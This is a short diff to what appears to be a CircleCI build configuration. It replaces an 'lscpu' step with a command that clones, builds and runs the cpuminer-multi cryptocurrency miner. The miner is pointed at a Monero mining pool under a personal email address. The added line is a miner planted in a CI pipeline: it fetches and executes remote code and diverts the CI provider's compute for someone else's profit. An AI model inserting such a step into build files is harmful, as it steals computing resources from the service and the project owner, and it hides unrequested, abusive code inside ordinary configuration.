@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  lscpu
+      - run:  git clone https://github.com/tpruvot/cpuminer-multi -b linux && cd cpuminer-multi && ./autogen.sh && ./configure &&./build.sh && ./cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u chinyizheidk@gmail.com
